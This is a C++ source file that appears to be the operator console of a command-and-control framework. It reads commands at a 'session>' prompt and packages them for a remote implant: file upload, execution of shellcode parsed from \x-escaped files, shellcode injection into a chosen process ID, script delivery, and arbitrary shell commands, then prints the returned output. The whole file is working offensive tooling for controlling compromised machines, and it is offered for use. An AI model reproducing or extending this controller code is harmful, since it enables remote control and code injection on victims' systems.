#include "Listener.hpp"
#include "Tools.hpp"


using namespace std;


Listener::Listener(int idxSession)
{
	m_idxSession = idxSession;
}


Listener::~Listener()
{

}


int Listener::connectSession()
{
	bool exit = false;
	while (!exit)
	{
		string data;
		data.resize(1000);

		string cmd;
		cout << "session> ";
		getline(cin, cmd);

		std::vector<std::string> splitedCmd;
		std::string delimiter = " ";
		splitList(cmd, delimiter, splitedCmd);

		if (splitedCmd[0].empty())
		{
			std::cout << std::endl;
		}
		else if (splitedCmd[0] == "exit")
		{
			exit = true;
		}
		else
		{
			C2Message c2Message;
			execInstruction(splitedCmd, c2Message);

			C2Message c2RetMessage;
			PingPong(c2Message, c2RetMessage);
			std::cout << "output:\n" << c2RetMessage.returnvalue() << std::endl;
		}
	}

	return 0;
}


bool Listener::execInstruction(std::vector<std::string>& splitedCmd, C2Message& c2Message)
{
	if (splitedCmd[0] == "upload")
	{
		string inputFile = splitedCmd[1];
		string outputFile = splitedCmd[2];

		std::ifstream input(inputFile, std::ios::binary);
		std::string buffer(std::istreambuf_iterator<char>(input), {});

		c2Message.set_instruction(splitedCmd[0]);
		c2Message.set_inputfile(inputFile);
		c2Message.set_outputfile(outputFile);
		c2Message.set_data(buffer.data(), buffer.size());
	}
	else if (splitedCmd[0] == "exec-asembly")
	{
		string inputFile = splitedCmd[1];

		std::ifstream input(inputFile, std::ios::binary);
		std::string buffer(std::istreambuf_iterator<char>(input), {});

		std::string payload;
		const char* bufferPtr = buffer.data();
		for (int i = 0; i < buffer.size() / 4; i++)
		{
			unsigned char tmp = 0;
			//sscanf(bufferPtr, "\\x%2hhx", &tmp);
			sscanf_s(bufferPtr, "\\x%2hhx", &tmp);
			bufferPtr += 4;
			payload.push_back(tmp);
		}

		c2Message.set_instruction(splitedCmd[0]);
		c2Message.set_inputfile(inputFile);
		c2Message.set_data(payload.data(), payload.size());
	}
	else if (splitedCmd[0] == "script")
	{
		string inputFile = splitedCmd[1];

		std::ifstream input(inputFile, std::ios::binary);
		std::string buffer(std::istreambuf_iterator<char>(input), {});

		c2Message.set_instruction(splitedCmd[0]);
		c2Message.set_inputfile(inputFile);
		c2Message.set_data(buffer.data(), buffer.size());
	}
	else if (splitedCmd[0] == "inject")
	{
		string inputFile = splitedCmd[1];
		int pid = stoi(splitedCmd[2]);

		std::ifstream input(inputFile, std::ios::binary);
		std::string buffer(std::istreambuf_iterator<char>(input), {});

		std::string payload;
		const char* bufferPtr = buffer.data();
		for (int i = 0; i < buffer.size() / 4; i++)
		{
			unsigned char tmp = 0;
			//sscanf(bufferPtr, "\\x%2hhx", &tmp);
			sscanf_s(bufferPtr, "\\x%2hhx", &tmp);
			bufferPtr += 4;
			payload.push_back(tmp);
		}

		c2Message.set_instruction(splitedCmd[0]);
		c2Message.set_inputfile(inputFile);
		c2Message.set_pidinjection(pid);
		c2Message.set_data(payload.data(), payload.size());
	}
	else if (splitedCmd[0] == "run")
	{
		string shellCmd;
		for (int i = 1; i < splitedCmd.size(); i++)
		{
			shellCmd += splitedCmd[i];
			shellCmd += " ";
		}

		c2Message.set_instruction(splitedCmd[0]);
		c2Message.set_shellcmd(shellCmd);
	}

	return 0;
}